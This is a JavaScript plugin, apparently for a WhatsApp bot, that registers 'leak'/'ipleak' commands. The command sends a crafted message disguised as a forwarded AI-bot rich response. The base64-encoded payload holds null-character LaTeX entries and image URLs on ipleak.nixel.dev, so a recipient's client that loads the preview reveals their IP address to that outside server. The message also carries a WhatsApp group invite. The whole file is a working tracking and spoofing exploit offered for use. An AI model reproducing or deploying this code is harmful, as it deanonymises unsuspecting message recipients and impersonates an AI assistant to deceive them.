export default {
  name: 'leak',
  category: 'other',
  command: ['leak', 'ipleak'],
  alias: ['ip'],
  settings: {
    owner: false,
    private: false,
    group: false,
    admin: false,
    botAdmin: false,
    loading: false
  },

  run: async (conn, m) => {
    await conn.relayMessage(
      m.chat,
      {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          botMetadata: {
            messageDisclaimerText: "",
            richResponseSourcesMetadata: {}
          }
        },
        botForwardedMessage: {
          message: {
            richResponseMessage: {
              messageType: 1,
              unifiedResponse: {
                data: Buffer.from(JSON.stringify({
                  "response_id": "24f4ec25-a8b4-45b5-8cb1-d2504e3ab640",
                  "sections": [
                    {
                      "__typename": "GenAIUnifiedResponseSection",
                      "view_model": {
                        "__typename": "GenAISingleLayoutViewModel",
                        "primitive": {
                          "__typename": "GenAIMarkdownTextUXPrimitive",
                          "text": "{{Z3PHWOLF}}\u0000{{/Z3PHWOLF}}",
                          "inline_entities": [
                            {
                              "__typename": "GenAITextInlineEntity",
                              "key": "Z3PHWOLF",
                              "metadata": {
                                "__typename": "GenAILatexItem",
                                "latex_expression": "\u0000",
                                "font_height": 24,
                                "padding": 4,
                                "latex_image": {
                                  "__typename": "GenAIMediaItem",
                                  "mime_type": "image/png",
                                  "url": "https://raw.githubusercontent.com/sbyuxD/sbyuxd-uploader/main/uploads/90fe1b-1785575792638.jpg",
                                  "url_fallback": "https://raw.githubusercontent.com/sbyuxD/sbyuxd-uploader/main/uploads/90fe1b-1785575792638.jpg",
                                  "width": 417.3913043478261,
                                  "height": 117.3913043478261,
                                  "expiration_timestamp_ms": 1786618500000
                                }
                              }
                            }
                          ]
                        }
                      }
                    },
                    {
                      "view_model": {
                        "primitive": {
                          "__typename": "GenAIImagePrimitive",
                          "preview_image": {
                            "__typename": "GenAIMediaItem",
                            "mime_type": "image/jpeg",
                            "url": "https://ipleak.nixel.dev/image/ip?timestamp=" + Date.now()
                          },
                          "full_image": {
                            "__typename": "GenAIMediaItem",
                            "mime_type": "image/jpeg",
                            "url": "https://ipleak.nixel.dev/image/ip?timestamp=" + Date.now()
                          }
                        },
                        "__typename": "GenAISingleLayoutViewModel"
                      }
                    },
                    {
                      "view_model": {
                        "primitive": {
                          "__typename": "GenAIFooterActionPrimitive",
                          "cta_text": "WhatsApp Group",
                          "cta_type": "OPEN_URL",
                          "cta_url": "https://chat.whatsapp.com/HTbYjcTOkchLLyXt7CynxI"
                        },
                        "__typename": "GenAISingleLayoutViewModel"
                      }
                    }
                  ]
                })).toString('base64')
              },
              contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardedAiBotMessageInfo: {
                  botJid: "0@bot"
                },
                forwardOrigin: 4
              }
            }
          }
        }
      },
      {}
    );
  }
};